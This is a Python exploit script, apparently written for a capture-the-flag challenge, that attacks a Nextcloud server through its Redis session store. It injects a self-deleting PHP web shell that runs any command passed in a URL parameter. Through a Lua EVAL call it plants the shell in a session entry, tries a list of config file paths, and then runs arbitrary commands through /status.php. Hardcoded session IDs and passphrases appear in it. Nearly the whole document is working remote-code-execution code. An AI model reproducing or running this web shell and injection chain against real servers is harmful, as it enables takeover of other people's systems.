#!/usr/bin/env python3
import http.client
import ssl
import urllib.parse
import sys
import gen_payload
import redis_ctl

HOST = "eci-2zehmcpck7adwc4zp3ma.cloudeci1.ichunqiu.com"
PORT = 443
SESSION_NAME = "ocd7jpv81dop"
SID = "68355a8fce1050da16de9580b7275e96"
PASS = "Yoxdiqdhfm9Pr1VANKUOu3BpHoBZifMKy38Tvnw23ckIr8LZUmNUTCbBtvkoVoydDYohsmRTWo3OJ3nVI7k08Z0WJQjhoApPzPo7dTUZ%2FzpDrjiJiRCJusXp8PiONJJb"
KEY = "PHPREDIS_SESSION:" + SID
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

CODE = "<?php $CONFIG=[]; if(isset($_GET[0])){ system($_GET[0]); @unlink(__FILE__); } ?>"


def cookies():
    return "%s=%s; oc_sessionPassphrase=%s" % (SESSION_NAME, SID, PASS)


def get(path, timeout=30, send_cookies=True):
    conn = http.client.HTTPSConnection(HOST, PORT, context=CTX, timeout=timeout)
    headers = {"User-Agent": "Mozilla/5.0 qwb2026"}
    if send_cookies:
        headers["Cookie"] = cookies()
    try:
        conn.request("GET", path, headers=headers)
        resp = conn.getresponse()
        body = resp.read()
        hs = resp.getheaders()
        status = resp.status
    except Exception as e:
        return "ERR:" + str(e), [], b""
    finally:
        conn.close()
    return status, hs, body


def inject(filename):
    payload = gen_payload.build(filename, "x", name=CODE)
    script = gen_payload.to_lua(payload)
    reply = redis_ctl.redis(6379, "EVAL", script, "1", KEY, print_reply=False)
    stored = redis_ctl.redis(6379, "STRLEN", KEY, print_reply=False)
    ok = stored.strip() == b":%d" % len(payload)
    print("  inject %s payload=%d stored=%r %s" % (filename, len(payload), stored.strip(), "OK" if ok else "BAD"))
    return ok


def trigger():
    status, hs, body = get("/index.php/login")
    sc = [v for k, v in hs if k.lower() == "set-cookie" and SESSION_NAME in v]
    print("  trigger status=%s bytes=%d cookie=%s" % (status, len(body), sc[0].split(";")[0] if sc else "none"))


def check(cmd, timeout=35):
    url = "/status.php?0=" + urllib.parse.quote_plus(cmd)
    status, hs, body = get(url, timeout=timeout, send_cookies=False)
    return status, body


def rce(cmd, marker):
    inject(CONFIG_PATH)
    trigger()
    full = "echo QWB_BEGIN_%s; %s; echo QWB_END_%s" % (marker, cmd, marker)
    status, body = check(full)
    text = body.decode("latin-1", "replace")
    b = "QWB_BEGIN_" + marker
    e = "QWB_END_" + marker
    i = text.find(b)
    j = text.find(e)
    out = text[i + len(b):j] if i != -1 and j != -1 else text
    print("  rce status=%s bytes=%d marker=%s" % (status, len(body), (i != -1 and j != -1)))
    print(out[:4000])
    return out


CANDIDATES = [
    "/var/www/html/config/qwb.config.php",
    "/var/www/nextcloud/config/qwb.config.php",
    "/var/www/html/nextcloud/config/qwb.config.php",
    "/var/www/nextcloud/html/config/qwb.config.php",
    "/opt/nextcloud/config/qwb.config.php",
    "/srv/http/nextcloud/config/qwb.config.php",
    "/usr/share/nginx/html/config/qwb.config.php",
    "/var/www/config/qwb.config.php",
    "/app/config/qwb.config.php",
    "/nextcloud/config/qwb.config.php",
    "/data/config/qwb.config.php",
]

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "probe"
    redis_ctl.TARGET = "https://" + HOST
    if mode == "probe":
        CONFIG_PATH = None
        for i, path in enumerate(CANDIDATES):
            marker = "M%d" % i
            print("[%d] try %s" % (i, path))
            if not inject(path):
                continue
            trigger()
            status, body = check("echo QWB_BEGIN_%s; echo QWB_END_%s" % (marker, marker))
            text = body.decode("latin-1", "replace")
            ok = ("QWB_BEGIN_" + marker) in text
            print("  check status=%s bytes=%d found=%s" % (status, len(body), ok))
            if ok:
                CONFIG_PATH = path
                open("config_path.txt", "w").write(path)
                print("SUCCESS CONFIG_PATH=" + path)
                break
        if CONFIG_PATH is None:
            print("no config path worked")
    elif mode == "cmd":
        CONFIG_PATH = open("config_path.txt").read().strip()
        cmd = sys.argv[2]
        rce(cmd, "X")
